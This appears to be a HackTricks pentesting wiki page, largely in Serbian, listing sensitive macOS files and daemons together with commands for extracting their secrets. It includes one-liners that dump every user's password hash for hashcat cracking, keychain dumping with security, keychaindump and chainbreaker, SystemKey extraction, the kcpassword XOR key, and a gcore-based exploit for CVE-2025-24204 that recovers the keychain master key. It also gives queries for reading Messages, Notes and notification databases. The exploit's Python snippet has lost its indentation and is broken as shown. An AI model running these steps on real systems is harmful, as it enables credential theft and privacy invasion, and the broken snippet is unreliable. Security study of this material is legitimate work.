# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Lozinke

### Shadow Lozinke

Shadow password se čuva sa korisnikovom konfiguracijom u plist fajlovima koji se nalaze u **`/var/db/dslocal/nodes/Default/users/`**.\
Sledeći oneliner može da se koristi za dump **svih informacija o korisnicima** (uključujući hash info):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte poput ovog**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) ili [**ovog**](https://github.com/octomagon/davegrohl.git) mogu se koristiti za transformaciju hash-a u **hashcat** **format**.

Alternativni one-liner koji će izbaciti creds svih non-service naloga u hashcat formatu `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Drugi način da se dobije `ShadowHashData` korisnika je korišćenjem `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ovaj fajl se **koristi samo** kada sistem radi u **single-user mode** (dakle, ne baš često).

### Keychain Dump

Imajte na umu da će, kada koristite security binary za **dump decrypted passwords**, nekoliko promptova tražiti od korisnika da dozvoli ovu operaciju.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Na modernom macOS najzanimljiviji backing stores su obično **`~/Library/Keychains/login.keychain-db`** i **`/Library/Keychains/System.keychain`**. To su fajlovi zasnovani na SQLite-u, ali se pristup plaintext-u i dalje posreduje preko **`securityd`**: krađa sirove DB uglavnom ti daje metadata i enkriptovane blobove, osim ako ne povratiš i korisničku lozinku, `SystemKey`, ili master key u memoriji.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Pregled Keychaindump-a

Alat pod nazivom **keychaindump** razvijen je za izvlačenje lozinki iz macOS keychain-ova, ali ima ograničenja na novijim macOS verzijama kao što je Big Sur, što je navedeno u [diskusiji](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Korišćenje **keychaindump**-a zahteva da napadač dobije pristup i eskalira privilegije do **root**-a. Alat koristi činjenicu da je keychain podrazumevano otključan pri prijavi korisnika radi praktičnosti, što omogućava aplikacijama da mu pristupaju bez ponovnog traženja korisničke lozinke. Međutim, ako korisnik izabere da zaključava svoj keychain nakon svake upotrebe, **keychaindump** postaje neefikasan.

**Keychaindump** radi ciljajući specifičan proces pod nazivom **securityd**, koji Apple opisuje kao daemon za autorizaciju i kriptografske operacije, ključan za pristup keychain-u. Proces ekstrakcije uključuje identifikovanje **Master Key**-a izvedenog iz korisničke login lozinke. Ovaj ključ je neophodan za čitanje fajla keychain-a. Da bi locirao **Master Key**, **keychaindump** skenira memorijski heap procesa **securityd** koristeći komandu `vmmap`, tražeći potencijalne ključeve unutar oblasti označenih kao `MALLOC_TINY`. Sledeća komanda se koristi za inspekciju ovih memorijskih lokacija:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nakon identifikovanja potencijalnih master ključeva, **keychaindump** pretražuje heap-ove u potrazi za specifičnim obrascem (`0x0000000000000018`) koji ukazuje na kandidata za master ključ. Dalji koraci, uključujući deobfuscation, neophodni su da bi se ovaj ključ iskoristio, kao što je opisano u izvornom kodu **keychaindump**. Analitičari koji se fokusiraju na ovu oblast treba da primete da se ključni podaci za dešifrovanje keychain-a nalaze u memoriji procesa **securityd**. Primer komande za pokretanje **keychaindump** je:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) može da se koristi za izdvajanje sledećih tipova informacija iz OSX keychain-a na forenzički ispravan način:

- Hashed Keychain password, pogodan za cracking pomoću [hashcat](https://hashcat.net/hashcat/) ili [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Ako je poznata lozinka za otključavanje keychain-a, master key dobijen pomoću [volafox](https://github.com/n0fate/volafox) ili [volatility](https://github.com/volatilityfoundation/volatility), ili unlock file kao što je SystemKey, Chainbreaker će takođe prikazati plaintext passwords.

Bez jednog od ovih metoda za otključavanje Keychain-a, Chainbreaker će prikazati sve ostale dostupne informacije.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dumppuj keychain ključeve (sa lozinkama) pomoću SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Izbacivanje keychain ključeva (sa lozinkama) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Ispisivanje keychain ključeva (sa lozinkama) pomoću memory dump-a**

[Pratite ove korake](../index.html#dumping-memory-with-osxpmem) da biste izvršili **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Damp keychain ključeve (sa lozinkama) koristeći korisničku lozinku**

Ako znate korisničku lozinku, možete je koristiti da **izvučete i dešifrujete keychains koji pripadaju korisniku**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) je isporučio `/usr/bin/gcore` sa entitlement-om **`com.apple.system-task-ports.read`**, tako da je svaki lokalni admin (ili zlonamerna potpisana aplikacija) mogao da dump-uje **memoriju bilo kog procesa čak i uz primenjen SIP/TCC**. Dump-ovanje `securityd` otkriva **Keychain master key** u clear i omogućava ti da dekriptuješ `login.keychain-db` bez korisničke lozinke.

**Brza repro na ranjivim build-ovima (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Pre **Sequoia**, obično možete pronaći Notification Center store u **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. U **Sequoia+** Apple ga je premestio u TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Većina zanimljivih informacija je pohranjena unutar **blob** kolona, tako da ćete morati da ekstrahujete taj sadržaj i transformišete ga u nešto čitljivo za čoveka (`plutil -p -`, `strings`, ili mali parser). Brzi primeri za triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Nedavni problemi sa privatnošću (NotificationCenter DB)

- Na macOS **14.7–15.1** Apple je čuvao sadržaj banera u SQLite `db2/db` bez pravilne redakcije. CVE-ovi **CVE-2024-44292/44293/40838/54504** su omogućavali svakom lokalnom korisniku da pročita tekst obaveštenja drugih korisnika samo otvaranjem DB-a (bez TCC prompta).
- Apple je ovo ublažio premeštanjem DB-a u `group.com.apple.usernoted` i zaštitom putem TCC na novijim Sequoia buildovima, tako da na trenutnim sistemima obično treba odgovarajući user context ili TCC bypass da bi se pročitao.
- Na legacy endpointima, kopirajte fajlove `db`, `db-wal` i `db-shm` zajedno pre update-a ili reboot-a ako želite da sačuvate artefakte.

### Napomene

Korisničke **notes** mogu se naći u `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Ako je one-liner iznad previše bučan, eksportuj `ZICNOTEDATA.ZDATA`, otpakuj ga sa gunzip, i parsiraj protobuf: ovo je obično pouzdanije nego direktno pokretanje `strings` nad SQLite bazom.

### Background Tasks / Login Items

Od **Ventura**, user-approved login items i nekoliko background tasks se prate u **BTM** store-ovima kao što su **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** i verzionisani sistemski keš **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ovi fajlovi su korisni za brzo identifikovanje persistence, helper tools, i nekih MDM-managed background items:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Za upornost i BTM internals, pogledajte [stranicu auto-start lokacija](../../macos-auto-start-locations.md#login-items) i [Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

U macOS aplikacijama preferences se nalaze u **`$HOME/Library/Preferences`**, a u iOS-u su u `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

U macOS-u CLI alat **`defaults`** može da se koristi za **modify Preferences file**.

**`/usr/sbin/cfprefsd`** claim-uje XPC servise `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i može da se pozove da izvrši akcije kao što je modify preferences.

## OpenDirectory permissions.plist

Fajl `/System/Library/OpenDirectory/permissions.plist` sadrži permissions primenjene na node atribute i zaštićen je pomoću SIP-a.\
Ovaj fajl dodeljuje permissions određenim korisnicima po UUID-u (a ne uid-u) tako da mogu da pristupe specifičnim sensitive information kao što su `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys` među ostalima:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Glavni daemon za obaveštenja je **`/usr/sbin/notifyd`**. Da bi primili obaveštenja, klijenti moraju da se registruju kroz `com.apple.system.notification_center` Mach port (proverite ih sa `sudo lsmp -p <pid notifyd>`). Daemon se može podešavati pomoću fajla `/etc/notify.conf`.

Nazivi koji se koriste za obaveštenja su jedinstvene reverse DNS notacije i kada se obaveštenje pošalje jednom od njih, klijent(i) koji su naznačili da mogu da ga obrađuju će ga primiti.

Moguće je ispisati trenutni status (i videti sva imena) slanjem signala SIGUSR2 procesu notifyd i čitanjem generisanog fajla: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

**Distributed Notification Center** čiji je glavni binary **`/usr/sbin/distnoted`**, je još jedan način za slanje notifikacija. Izlaže neke XPC services i izvršava neke provere kako bi pokušao da verifikuje klijente.

### Apple Push Notifications (APN)

U ovom slučaju, applications mogu da se registruju za **topics**. Klijent će generisati token kontaktirajući Apple-ove servere kroz **`apsd`**.\
Zatim će i providers takođe generisati token i moći će da se povežu sa Apple-ovim serverima kako bi slali poruke klijentima. Ove poruke će lokalno primati **`apsd`**, koji će proslediti notifikaciju aplikaciji koja na nju čeka.

Preferences se nalaze u `/Library/Preferences/com.apple.apsd.plist`.

Postoji lokalna database poruka koja se nalazi u macOS-u u `/Library/Application\ Support/ApplePushService/aps.db` i u iOS-u u `/var/mobile/Library/ApplePushService`. Ima 3 tables: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Takođe je moguće dobiti informacije o daemon-u i konekcijama koristeći:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Ovo su notifications koje korisnik treba da vidi na ekranu:

- **`CFUserNotification`**: Ovi API pružaju način da se prikaže pop-up na ekranu sa porukom.
- **The Bulletin Board**: Ovo u iOS prikazuje banner koji nestaje i biće sačuvan u Notification Center.
- **`NSUserNotificationCenter`**: Ovo je iOS bulletin board u MacOS. Na starijim macOS izdanjima baza podataka obično se nalazi u `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; na Sequoia+ je premeštena u `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- **HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)**(https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- **Apple Platform Security – Keychain data protection**(https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- **9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia**(https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
